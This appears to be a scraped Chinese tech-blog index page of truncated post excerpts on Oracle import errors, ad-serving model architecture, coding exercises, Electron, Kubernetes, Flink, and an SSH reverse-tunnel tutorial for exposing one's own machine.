[oracle@hcssdb dpdump]$ more package_csh_chac20240126.log ;;; Import: Release 11.2.0.4.0 - Production on 星期五 1月 26 14:02:52 2024 Copyright (c) 1982, 2011, Oracle and/or its affiliates. All rights reserved. ;;; Connected to: Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production With the Partitioning, OLAP, Data Mining and Real Application Testing options ORA-31694: 加载/卸载主表 "CLOUD"."SYS_IMPORT_FULL_01" 失败 ORA-31644: 无法定位块编号 549045 (在转储文件 "/u01/app/oracle/admin/hcssdb/dpdump/package_csh_chac_240123.dmp" 中) 2.查看文件
[oracle@hcssdb dpdump]$ ll 总用量 774296 -rw-r--r-- 1 oracle oinstall 501 1月 26 14:11 package_csh_chac20240126_2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d1298c10c206f19f961bc0cc98942cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b6e9f1bdfbbb154a47d4b7cca15aa36/" rel="bookmark">
			京东广告算法架构体系建设--在线模型系统分布式异构计算演变 | 京东零售广告技术团队
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、现状介绍 算法策略在广告行业中起着重要的作用，它可以帮助广告主和广告平台更好地理解用户行为和兴趣，从而优化广告投放策略，提高广告点击率和转化率。模型系统作为承载算法策略的载体，目前承载搜索、推荐、首焦、站外等众多广告业务和全链路的深度学习建模，是广告算法算法创新和业务迭代发展的重要基石。
架构全景图：
1.平台能力：
1.高吞吐高并发：百亿PV，百万QPS
2.低延迟，高可靠：万亿次预估计算/秒，毫秒级延迟，99.99%
3.集群规模：1W+节点
4.迭代周期：3次/天
2.系统能力
1.模型规模：TB级模型预估
2.异构计算：CPU/GPU异构计算
3.在线学习：分钟级模型更新
4.实时图计算：亿级节点、百亿级边；分钟级图数据更新
5.层次化算力：实时计算、离线计算、近线计算
二、发展历程 广告在线模型系统发展大致分为三个主要阶段：
1、深度学习时代：通过组件化、平台化、配置化完成架构的统一和流程机制的规范化，解决迭代效率问题。
2、大模型时代：通过分布式分图计算架构解决模型规模和实效性的问题。
3、算力时代：通过层次化算力建设解决全链路算力协同的问题。
1、深度学习时代——架构统一/迭代效率 广告在线模型系统初期缺乏统一的系统架构和流程机制，随着Tensorflow开源，算法的离线调研能力大幅提升，对应的在线模型架构算法迭代效率问题日益凸显。主要面临的问题如下：
◦业务接入成本高：广告业务涉及的业务较多，包括搜索、推荐、首焦、站外，模型涉及到CTR模型、CVR模型、CPA模型。每个业务都要面临新加广告场景、新加/修改模型，都需要添加额外的开发支持，接入效率低成本高。
◦特征繁多，数据不统一，算法实验低效：1）特征来源较多，有商品特征、用户特征、请求特征，没有统一的数据使用规范。2）特征种类也比较多，每个业务用的特征也比较独立，不利于复用。
◦算法和工程耦合：算法模型强依赖算法服务，模型结构修改都要带来服务修改，影响模型迭代。缺乏配置化导致算法扩展困难。
为了解决以上问题，我们将整体框架进行模块化升级，抽象出三个核心模块：
◦模型接入服务：负责流量管控，统一流量接入规则，与业务逻辑解耦。
◦特征计算服务：负责数据管理和特征提取，统一数据接入规则。
◦模型推理服务：负责模型推理、更新和落日志，统一模型接入规则。
1.1 模型接入 模型接入包含三大功能：
◦流量路由：流量路由的核心是进行动态流量识别，根据配置动态构建语法树，将流量映射到语法树中，从而做到识别流量全路径，包括流量从哪里来、到哪里去。当有新的流量进入或着加入新的模型，可在语法树中添加或修改叶节点，实现动态路由。同时在分层实验中，使用语法树，也可实现流量分层，增加小流量试验的并发度，提升流量使用效率。
◦流量分发：根据流量路由结果进行分发，针对广告队列较多的情况，会将请求进行拆分，并行请求特征和模型推理，实现并行加速。
◦流量防护：对上游来说，通过流量路由拦截异常流量。对下游来说，通过实时监控下游负载，实现动态负载均衡，拦截超负载流量，保护下游服务的安全。
1.2 特征计算 特征计算包含两大功能：
◦数据管理：1、支持多类型数据源，包括三类：1）解析请求获取请求中的原始特征。2）本地数据支持特征词表获取离线特征。3）远程数据请求用户、商品等服务获取用户商品的实时特征。2、数据统一：通过特征转换统一特征格式，方便模型进行特征解析。
◦特征计算：将特征计算算子化，通过注册类的方式实现配置化，提升特征开发效率和复用效率。
1.3 模型推理 为了方便算法迭代，将架构拆分成两层，通过分层的设计，将模型和服务解耦，解决架构和模型迭代冲突的问题，提升模型迭代效率。
◦推理引擎层：推理引擎支持模型推理加速，目前支持多种推理引擎（TensorFlow、TensorRT、FasterTransformer等）
◦服务层：负责消息处理、特征日志、模型管理。
▪特征日志：支持落实时请求级的特征日志，通过离线拼接生成训练样本。
▪模型管理：通过NormGuard机制对训练模型进行校验，防止将不合规模型推到线上。
1.4 总结 架构上，通过以上服务化、单元化、配置化的升级，实现更高层级的抽象，实现一套架构支持所有算法业务。规范上，实现流量、数据、模型统一标准化。降低算法实验难度，整体迭代周期从周级别提升到天级别，极大提升了算法的迭代效率。
第一阶段的在线模型系统升级，将业务开发由无序到有序，架构从散乱到统一，奠定在线模型系统的基础，也为后续的架构发展提供更多可能。
2、大模型时代——模型规模/时效 平台化加速了模型迭代的同时，业界和广告内部也进入大模型的探索阶段，落地期间遇到模型复杂、参数规模大、时效性低等问题，大模型对算力的需求变得迫切。
◦模型复杂：深度模型的引入极大加速模型的发展，同时也带来模型复杂度的指数提升，以Transfomer为代表的全新神经网络框架，奠定了大模型的算法架构基础，复杂度的提升对模型计算提出更高的要求。
◦参数规模大：用户的增长，商品数量的扩展，带来数据量的爆炸，模型为了更好的模拟现实，参数量也成爆炸性增长。从广告场景内看，算法模型的参数规模也从十亿向着百亿、千亿发展，参数规模的增长对模型存储、IO提出了更高的要求。
◦时效性低：这个阶段模型的更新周期普遍在天级别，实效性较低，尤其在大促人货场发生快速变化的时候，模型更新跟不上用户、商品的变化，会带来搜索/推荐效果折损。
针对以上问题，我们基于离在线一体化设计研发分布式分图计算架构提升算力水平，支持更大参数规模的模型，同时支持OnlineLearning进一步提升时效性，同时在引入图计算提升模型表达能力。
2.1 分布式分图计算架构 1.计算分层：分析复杂的模型网络拓扑结构，基于计算密集逻辑&amp;数据I/O密集进行计算分层
2.存储分层：稀疏&amp;稠密参数分层，充分利用CPU/GPU存储特点
3.离在线一体算力协同：提升模型规模和实效性，做到业界先进水平
效果：
1.在线算力提升10倍+，离线训练性能提升1倍+
2.搜索排序模型参数规模扩大8倍，点消+3%。推荐排序模型升级百G大模型助力算法收益点消+8%。
2.2 OnlineLearning 1.支持增量更新：提供参数增量更新解决方案，更新间隔由天级别缩短为分钟级别。
2.架构高可用，支持快速回滚
效果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b6e9f1bdfbbb154a47d4b7cca15aa36/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f5fc4f5fcd0b82e8600fa3654037001/" rel="bookmark">
			Cantor表（刷题）（C语言）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人博客主页：https://blog.csdn.net/2301_79293429?type=blog
专栏：https://blog.csdn.net/2301_79293429/category_12545690.html
题目描述 现代数学的著名证明之一是 Georg Cantor 证明了有理数是可枚举的。他是用下面这一张表来证明这一命题的：
我们以 Z 字形给上表的每一项编号。第一项是 1/11/1，然后是 1/21/2，2/12/1，3/13/1，2/22/2，…
输入格式 整数N（1≤N≤10^7）。
输出格式 表中的第 N 项。
输入输出样例 输入 7 输出 1/4 题目链接: 记录详情 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)
题目分析: 将题目中的图像写为易观察的形式:
/* 1/1
1/2 2/1
3/1 2/2 1/3 设最上面一行为第1行，本题用i表示，
第i行的分子分母之和为i+1，除了第一行，偶数行的分子从1开始，奇数行从i开始
*/
AC代码: int main() { int n; scanf("%d", &amp;n); if (n == 1) printf("1/1"); else { int i = 0, j = 1, sum = 0; for (i = 1;; i++) { sum += j++; if (sum &gt;= n) break; } sum -= i;/*前面几行的总个数*/ if (i % 2 == 1)/*奇数行*/ { j = 0; if (sum == n - 1) printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f5fc4f5fcd0b82e8600fa3654037001/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/486f203770867ec2e4db11d1a7c09d8b/" rel="bookmark">
			springboot128企业人事管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 【毕设源码推荐 javaweb 项目】基于springboot+vue 的中小企业人事管理系统代码
适用于计算机类毕业设计，课程设计参考与学习用途。仅供学习参考， 不得用于商业或者非法用途，否则，一切后果请用户自负。
看运行截图看 第五章 第四章 获取资料方式 **项目编号：springboot128 **
**源码合集(千套源码任你挑)：www.yuque.com/mick-hanyi/javaweb **
**源码下载：私小编 **
项目包含 开发环境 jdk: JDK 1.8部署工具：IntelliJ IDEA 2023.xx/Eclipse.xxx数据库：Mysql 5.7.20Tomcat: Tomcat 8.0.xx/9.0.xx 项目内容 中小型企业人事管理系统 摘 要 随着科学技术的飞速发展，社会的方方面面、各行各业都在努力与现代的先进技术接轨，通过科技手段来提高自身的优势，中小企业人事管理系统当然也不能排除在外。中小企业人事管理系统是以实际运用为开发背景，运用软件工程原理和开发方法，采用springboot框架构建的一个管理系统。整个开发过程首先对软件系统进行需求分析，得出系统的主要功能。接着对系统进行总体设计和详细设计。总体设计主要包括系统功能设计、系统总体结构设计、系统数据结构设计和系统安全设计等；详细设计主要包括系统数据库访问的实现，主要功能模块的具体实现，模块实现关键代码等。最后对系统进行功能测试，并对测试结果进行分析总结，得出系统中存在的不足及需要改进的地方，为以后的系统维护提供了方便，同时也为今后开发类似系统提供了借鉴和帮助。这种个性化的网上管理系统特别注重交互协调与管理的相互配合，激发了管理人员的创造性与主动性，对中小企业人事管理系统而言非常有利。
本中小企业人事管理系统采用的数据库是Mysql，使用springboot框架开发。在设计过程中，充分保证了系统代码的良好可读性、实用性、易扩展性、通用性、便于后期维护、操作方便以及页面简洁等特点。
关键词：中小企业人事管理系统，springboot框架 Mysql数据库 Java技术
第1章 绪论 1.1背景及意义 随着社会的快速发展，计算机的影响是全面且深入的。人们生活水平的不断提高，日常生活中人们对中小企业人事管理系统方面的要求也在不断提高，随着中小企业人事受到广大员工的关注，使得中小企业人事管理系统的开发成为必需而且紧迫的事情。中小企业人事管理系统主要是借助计算机，通过对中小企业人事管理系统所需的信息管理，增加员工的选择，同时也方便对广大中小企业人事管理系统的及时查询、修改以及对中小企业人事管理系统的及时了解。中小企业人事管理系统对员工带来了更多的便利，该系统通过和数据库管理系统软件协作来满足员工的需求。计算机技术在现代管理中的应用，使计算机成为人们应用现代技术的重要工具。能够有效的解决获取信息便捷化、全面化的问题，提高效率。
本中小企业人事管理系统主要牵扯到程序，数据库与计算机技术等。覆盖知识面大，可以大大的提高系统人员工作效率。
1.2 国内外研究概况 随着国内经济形势的不断发展，中国互联网进入了一个难得的高峰发展时期，这使得中外资本家纷纷转向互联网市场。然而，许多管理领域的不合理结构，人员不足以及管理需求的增加使得更多的人具备了互联网管理的意识。
在当今高度发达的信息中，信息管理改革已成为一种更加广泛和全面的趋势。“中小企业人事管理系统”是基于Mysql数据库，在springboot框架程序设计的基础上实现的。为确保中国经济的持续发展，信息时代日益更新，中小企业人事管理系统更是蓬勃发展。同时，随着信息社会的快速发展，中小企业人事管理系统面临着越来越多的信息，因此很难获得他们对高效信息的需求，如何使用方便快捷的方式使查询者在广阔的中小企业人事管理系统信息中查询，存储，管理和共享信息方面有效，对我们的学习，工作和生活具有重要的现实意义。因此，国内外学术界对此进行了深入而广泛的研究，一个新的研究领域——中小企业人事管理系统诞生了。
1.3 研究的内容 目前许多人仍将传统的纸质工具作为信息管理的主要工具，而网络技术的应用只是起到辅助作用。在对网络工具的认知程度上，较为传统的office软件等仍是人们使用的主要工具，而相对全面且专业的中小企业人事管理系统的信息管理软件仍没有得到大多数人的了解或认可。本选题则旨在通过标签分类管理等方式，实现管理员：首页、个人中心、员工管理、部门信息管理、职位信息管理、福利信息管理、培训信息管理、任务信息管理、工资信息管理、考勤信息管理、招聘信息管理，员工；首页、个人中心、部门信息管理、福利信息管理、培训信息管理、任务信息管理、工资信息管理、考勤信息管理功能。从而达到对中小企业人事管理系统信息的高效管理。
相关技术 2.1 Tomcat服务器 Tomcat属于一种轻型的服务器，所以说在中小企业中并不具有普适性。但是当程序员需要开发或调试JSP 程序时，则通常会将该服务器作为首选。对于一个仅具有计算机基础知识的人来说，计算机系统具有一个好的Apache服务器，可以很好的对HTML 页面进行访问。Tomcat 虽然是Apache的扩展，但是它们都是可以独立运行的，二者是不互相干扰的。当配置正确的时候，Apache服务器为HTML 页面的运行提供技术支持，Tomcat 的任务则是运行Servle和JSP 页面。Tomca也具有一定的HTML页面处理功能。
2.2 Java技术介绍 Java语言擅长开发互联网类应用和企业级应用，现在已经相当的成熟，而且也是目前使用最多的编程语言之一。Java语言具有很好的面向对象性，可以符合人的思维模式进行设计，封装是将对象的属性和方法尽可能地隐藏起来，使得外界并不知道是如何实现的，外界能通过接口进行访问，继承是指每个类都会有一个父类，所有的子类都有父类的方法，可以进行继承，但是只有final修饰的类不能被继承，通过继承可以使得代码得到重新利用，能够提高软件的开发效率，也是多态的前提。
Java就像C语言、C#语言等，也是一种程序开发语言，而它的特点就是面向对象。作为一种程序开发与设计的语言，它有很多特性，主要特性就是面向对象、夸平台以及可以分布式运行。Java语言项目不但安全性高、稳定性强，而且可以并发运行。
为了提高开发的速度及效率，必须做到代码的重复使用和简化程序的复杂度，要达到上述的要求java语言通过封装、继承与多态等方式实现，这样可以很大程度上达到信息的封装，提高代码复用率，减少冗余度，提高效率。它使得以往程序中大量存在的内存泄漏的问题得到了较好的缓解。所谓的内存泄漏就是程序向操作系统申请了一块存储空间，比如定义了一个变量，但是由于某种原因，这个变量一直没有使用，但是仍然占用着系统的内存空间，可能一两个这样的变量对程序和操作系统造不成什么大的影响，但是试想如果这样的变量定义的多了系统的内存空间就会一步步减少，从而造成机器的性能降低甚至宕机。但是在Java中有垃圾回收机制的存在，这种机制极大地避免了内存泄漏的出现，在Java虚拟机中，垃圾回收机制会对长时间没有引用变量指向的对象实施垃圾回收，简单的说就是将这个对象销毁，以避免内存泄漏的情况出现。
2.3 mysql数据库介绍 MySQL是一款Relational Database Management System，直译过来的意思就是关系型数据库管理系统，MySQL有着它独特的特点，这些特点使他成为目前最流行的RDBMS之一，MySQL想比与其他数据库如ORACLE、DB2等，它属于一款体积小、速度快的数据库，重点是它符合本次毕业设计的真实租赁环境，拥有成本低，开发源码这些特点，这也是选择它的主要原因。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/486f203770867ec2e4db11d1a7c09d8b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6acad1273da0d4a8d9d4aa6335625c1a/" rel="bookmark">
			js合并相同结构的对象，内容不覆盖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景 两个结构相同的对象，要将它们具备相同key的数据合并，一般的方法会导致后面覆盖前面，所以需要特殊处理。
用一个简单的demo数据作为例子。
let obj1 = {
name: [{ text: “王妃1” }, { text: “王妃2” }],
age: [{ num: “12” }, { num: “13” }],
};
let obj2 = {
name: [{ text: “秦王3” }, { text: “秦王4” }],
age: [{ num: “45” }, { num: “46” }],
};
要转换为下面这种：
{
name: [ { text: ‘王妃1’ }, { text: ‘王妃2’ }, { text: ‘秦王3’ }, { text: ‘秦王4’ } ],
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6acad1273da0d4a8d9d4aa6335625c1a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ef5c78bb5bf08cc06930eaf563a2053/" rel="bookmark">
			Vite&#43;Electron快速构建一个VUE3桌面应用(二)——动态模块热重载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 简介 在上一篇文章Vite+Electron快速构建一个VUE3桌面应用中，我们了解了如何使用Vite和Electron来快速构建一个Vue3桌面应用。但是，之前构建的应用仅仅是一个简单的版本。在开发过程中，为了更好的开发体验，在开发electron的时候，肯定也希望能有动态模块热重载（HMR），更别说vite那迅雷不及掩耳盗铃儿响叮当之势的加载速度。
因此，接着上一篇文章所完成的项目代码，我们来完成Vite和Electron开发时的动态模块热重载功能。
二. 思路 先说结论，可利用electron中的mainWindow.loadURL(&lt;your-url&gt;)来实现。
对于动态模块热重载功能来说，无论是webpack还是vite，其都是将构建内容存入内存，因此我们无法使用mainWindow.loadFile('dist/index.html')这样加载文件的方式。
但是，单纯地改变该配置也是不行的，需要使用vite将开发服务器运行起来，可以正常运行动态模块热重载，而electron直接加载其开发服务器可访问的url，即http://localhost:3000。
三. 实现步骤 1. 编辑main.js 将mainWindow.loadFile('dist/index.html')更新为mainWindow.loadURL("http://localhost:3000")，更新后的文件如下所示：
// main.js // 控制应用生命周期和创建原生浏览器窗口的模组 const { app, BrowserWindow } = require('electron') const path = require('path') function createWindow () { // 创建浏览器窗口 const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, 'preload.js') } }) // 加载 index.html // mainWindow.loadFile('dist/index.html') 将该行改为下面这一行，加载url mainWindow.loadURL("http://localhost:3000") // 打开开发工具 // mainWindow.webContents.openDevTools() } // 这段程序将会在 Electron 结束初始化 // 和创建浏览器窗口的时候调用 // 部分 API 在 ready 事件触发后才能使用。 app.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4ef5c78bb5bf08cc06930eaf563a2053/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29b5dccb517a384956e8079884ddff92/" rel="bookmark">
			比特币 ETF 费用战蔓延至欧洲
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		撰文：Jessica Tasman-Jones，Ignites Europe
编译：Tia，Techub News
点击查看Techub News相关推荐
在多个比特币现货ETF正式向美国投资者开放之后，Invesco 和 WisdomTree 已将旗下欧洲比特币投资产品的费用基数降低了 60% 以上。
美国证券交易委员会本月批准了贝莱德、富达和景顺等公司的比特币现货 ETF。
景顺欧洲、中东和非洲以及亚太地区 ETF 主管 Gary Buxton 表示，新通过的比特币现货 ETF 为美国投资者带来了新的投资产品。
专家表示，此前传统市场投资者若要投资加密货币需要通过加拿大或欧洲供应商推出的交易所交易产品。
Buxton 表示，随着美国市场「努力寻找供需之间的新平衡」，「多家」提供商降低了费用，由此 ETF 产生的费用「大大低于」欧洲现有的跟踪类产品。
Ark Investment Management 曾表示，其推出的比特币现货 ETF 的费率将设置为 0.8%，但其最终的收费标注为在前六个月或资产达到 10 亿美元之前不收取任何费用。在此之后将收取 0.21% 的费用。
贝莱德推出的比特币现货 ETF 管理费用为 0.25% ，早期投资者目前可以以 0.12% 的费率投资该产品，直到贝莱德管理资产达到 50 亿美元。
HanETF 首席执行官 Hector McNeil 表示，美国交易所上市的比特币现货 ETF 的「价格战」可能会在 0.3% 左右结束。
McNeil 表示，低于0.3%，ETF 提供商可能无法盈利，除非他们吸引「数十亿美元」的管理资产。他怀疑大多数供应商无法吸引到如此多的资产，因此会在「中期」关闭。
WisdomTree 和 Invesco 对此反应则是将欧洲上市的比特币交易所交易产品的费用减少了 60% 以上。
3.25 亿美元的 WisdomTree 实物比特币 ETP 的费用将从 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29b5dccb517a384956e8079884ddff92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fecb01f08312270b3095e1e41f98506b/" rel="bookmark">
			组装测试阿尔泰科技PXIE机箱控制器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一个PXIe机箱由几项组件所组成，包含了一个机箱(含背板+电源)、系统控制器以及数个外设模块，当然务必有鼠标键盘显示器。
在此以一个高度为3U的9槽PXIe系统为例。系统控制器，也就是CPU模块，位于机箱的左边第.一.槽，其左方预留了三个扩充槽位给系统控制器使用，以便插入因功能复杂而体积较大的系统卡。由第.二.槽开始至第八槽称为外设槽，可以让用户依照本身的需求而插上不同的仪器模块。其中第.二.槽又可称为星形触发控制器槽。
工具/原料
· 1、PXIEC7309机箱一台
· 2、阿尔泰PXIE7682控制器一台
· 3、带DP的显示器一台
安装方法
1、 收到产品包装后，PXIE机箱是一个包装，PXIE控制器是一个包装。分别打开包装放置在桌面上，去掉PXIE机箱上，正面左测的4个挡片，露出红色槽位。如图：
去掉PXIE控制器上助拔器上面的黑色保护胶套。如图
2、 把控制器放入PXIE机箱的槽位中，（注意上下槽都要放进去），然后缓慢向后推，直到推到底部，锁紧，再把控制器4周的螺丝拧劲。
3、 其他准备工作：把PXIE机箱电源线接上，USB鼠标键盘接控制器USB口，DP显示器接上。到此为至，硬件已连接完毕。
4、 上电测试：直接按PXIE机箱上的开关按钮即可。
5、 控制器的拆除方法。把控制器4周螺丝送掉，然后按下助拔器的红色卡扣，能听到响声即可，然后缓慢拔出。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a14dc6ee98eab54d5c47ff55ea160e4/" rel="bookmark">
			k8s 进阶实战笔记 | Pod 创建过程详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Pod 创建过程详解 ​
初始状态0
controller-manager、scheduler、kubelet组件通过 list-watch 机制与 api-server 通信并检查资源变化
第一步
用户通过 CLI 或者 WEB 端等方式向 api-server 发送创建资源的请求（比如：我要创建一个replicaset资源），api-server 会对这个请求做出认证、鉴权响应
成功则继续下一步失败则返回错误信息给源头 第二步
api-server 将这次部署信息存放在数据库 etcd 中
第三步
etcd 上报这次部署信息给 api-server
第四步和第五步
api-server 接受到上报的部署信息后，controller-manager 通过list-watch 机制检查到新的部署信息，将部署信息加入内部工作队列，然后检查发现资源没有关联的 pod 信息等资源，启动对应的控制器创建相关资源，然后将这些创建的部署资源信息上报给 api-server
第六步
api-server 接收到上报信息后，将部署信息存放在 etcd 中
第七步
etcd 接收到创建部署Pod的信息后，再次上报给 api-server
第八步和第九步
api-server 接受到上报的部署信息后，scheduler通过list-watch 机制检查到新的pod部署信息，并通过预选以及优选策略算法，计算这次pod部署最终可调度的node节点，并上报给 api-server
第十步
api-server 将部署调度信息存放在 etcd 中
第十一步
etcd 接收到新的pod调度信息，再次上报给api-server
第十二步
kubelet也是通过 list-watch 机制来获取自身node上所要运行的pod清单，通过与自己的内部缓存进行比较，如果有新的资源就会触发钩子调用 CNI 、CRI、CSI等接口去启动容器和卷的挂载，然后启动 pod 容器
后续
kube-proxy 组件会为新创建的pod注册动态DNS到CoreDNS，给pod的svc添加iptables规则，用于服务发现和负载均衡，controller 会通过控制循环将当前 pod 状态与用户所期望状态一直对比，如果状态不同，则会修改为用户期望状态，亦或者删除重新创建pod
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a14dc6ee98eab54d5c47ff55ea160e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7445f0d115d0e18e0026934781851b38/" rel="bookmark">
			HTML5画布绘制实心圆、三角形、五边形、五角星
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景
纯原生canvas绘制，可以自定义位置、颜色等信息。
实现
以下封装成方法，调用后传参即可。图形两角间边距暂时写死，可以自行加减参数来调整。
1.实心圆
function circular(x, y, radius, fillColor, strokeColor){
ctx.beginPath();//开始绘制
ctx.arc(x, y, radius, 0, 2 * Math.PI); //arc 的意思是“弧”
ctx.fillStyle = fillColor; //设置填充颜色
ctx.fill(); //开始填充
ctx.strokeStyle = strokeColor; //将线条颜色设置为蓝色
ctx.setLineDash([]);
ctx.stroke(); //stroke() 方法默认颜色是黑色（如果没有上面一行，则会是黑色）。
}
2.三角形
function triangle(x, y, fillColor){
ctx.beginPath();
ctx.moveTo(x, y); //上顶点
ctx.lineTo(x - 23, y + 22); //左顶点
ctx.lineTo(x + 8, y + 15); //右顶点
ctx.stroke();
ctx.fillStyle = fillColor;
ctx.fill();
}
3.五边形
function pentagon(x, y, fillColor){
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7445f0d115d0e18e0026934781851b38/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0ee46cf601ada9e60f4fd663194f566/" rel="bookmark">
			SSH妙用之（一）内网穿透
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于有内网穿透需求的人来说，通常采用现成的工具，如ngrok、frp等，这些工具，如果没有明白其原理，那么配置起来，可能难于理解。其实还有更简单的方式，那就是通过ssh命令行工具来实现内网穿透。
今天我们就用ssh来实现内网穿透，并且可以深刻理解内网穿透的原理，减少非常多的配置，一个命令就搞定了，是不是很方便呢？
一、实现内网穿透的准备工作
1、要实现内网穿透，要求你有一台公网的服务器和一台需要穿透的内网本地电脑。前者可以租用便宜的linux云服务器，后者即你自己的电脑，将这台电脑通过内网穿透后，做成对外服务器，这台电脑根据情况，可以是linux，也可以是windows。
2、确保在linux云服务器已经安装了sshd，这可以通过安装openssh实现。通常已经安装，因为远程登录和管理都是必需的。并且确保防火墙没有禁止访问，总之保证可以用ssh远程登录这台服务器。
3、确保在本地电脑上已经正确安装ssh客户端，对于linux，通常默认带有，对于windows，下载安装openssh的windows版安装，保证ssh命令可以使用。
二、命令参数
ssh -NR 3034:192.168.1.2:3389 root@远程ip或地址
在本地电脑运行以上命令后，需要输入远程linux云服务器的root密码，如果命令行窗口闪烁光标，这样内网穿透便成功了。此时，用户通过访问linux云服务器的3034端口，即可以访问到你本地电脑的3389端口。
以下是参数解释：
1、-NR中的-R参数，是内网穿透的重点
2、3034：你需要开放的远程linux服务器的哪一个端口，可以根据情况设定。不要和已经打开的端口冲突，也要确保防火墙没有防住这个端口
3、192.168.1.2：即你本地电脑的内网ip，还可以指定成与你本地电脑在同一个网络中的另一个电脑的IP，把它当作服务器。这也是其妙用。
4、3389：本地电脑当服务器的服务端口。
5、root：是远程云服务器的管理员账号。
6、@远程ip或地址：就是你的远程云服务器，可用ip或域名代替（如果有正确的域名解析的话）。
再把上述命令效果解释一遍就是：通过访问远程linux云服务器的3034端口，就相当于访问本地电脑192.168.1.2的3389端口，这样就实现了内网穿透，成功将本地电脑的3389即远程桌面，推到了公网上去。
好了，
下一期，我们将采用另一个参数 -L，实现另一个重要用途。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a886db8fc886c6cd7b30b9b55df73fc7/" rel="bookmark">
			[全志平台]解决power键关机产生破音(方法一)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 在产品开发里碰到了一个常见的bug，就是按power键关机时会有明显的破音。采用在power流程中把功放脚拉低。
二、代码路径 Android\longan\kernel\linux-5.4\drivers\power\reset\gpio-poweroff.c Android\longan\kernel\linux-5.4\sound\soc\sunxi\sun50iw12-codec.c 三、代码操作 extern出功放脚的操作函数，在gpio-poweroff.c文件的power流程中提前拉动功放脚
sun50iw12-codec.c：
void hotack_codec_spk_ctr(int spkon) { if(sunxi_codec_tmp != NULL) { struct codec_spk_config *spk_cfg = &amp;(sunxi_codec_tmp-&gt;spk_cfg); if(spkon == 0) { /* Disable the PA Here */ if (spk_cfg-&gt;spk_used) { gpio_set_value(spk_cfg-&gt;spk_gpio, !(spk_cfg-&gt;pa_level)); // if (spk_cfg-&gt;pa_msleep &gt; 0) { // msleep(spk_cfg-&gt;pa_msleep); // } } } else { /* Enable the PA Here */ if (spk_cfg-&gt;spk_used) { // if (spk_cfg-&gt;pa_msleep &gt; 0) { // msleep(spk_cfg-&gt;pa_msleep); // } gpio_direction_output(spk_cfg-&gt;spk_gpio, 0x1); gpio_set_value(spk_cfg-&gt;spk_gpio, spk_cfg-&gt;pa_level); } } } } EXPORT_SYMBOL(hotack_codec_spk_ctr); gpio-poweroff.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a886db8fc886c6cd7b30b9b55df73fc7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d19d3a0a5ff4856df223046c4a644b72/" rel="bookmark">
			Flink 2.0 状态管理存算分离架构演进
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文整理自阿里云智能 Flink 存储引擎团队负责人梅源在 Flink Forward Asia 2023 的分享，梅源结合阿里内部的实践，分享了状态管理的演进和 Flink 2.0 存算分离架构的选型。内容主要分为以下五部分：
引言为什么状态对 Flink 如此重要状态存储提升 ——社区和商业版状态存储状态管理存算分离架构 ——架构演进和挑战总结 1. 引言 我们在这个时间点重新聊状态存储这个话题是因为状态存储是流计算的核心。Flink 从 2017 年 VLDB 发表奠基之作介绍状态存储发展至今，Flink 在状态这部分的架构基本并没有太大的变化。但时代是在不断演进和变化的，无论部署模式、存储模式，还是作业负载，都已经发生了翻天覆地的变化。
从部署模式看，我们经历了 map-reduce 时代 Cluster 上没有资源隔离的部署，到云原生时代 K8S 容器为粒度隔离部署。
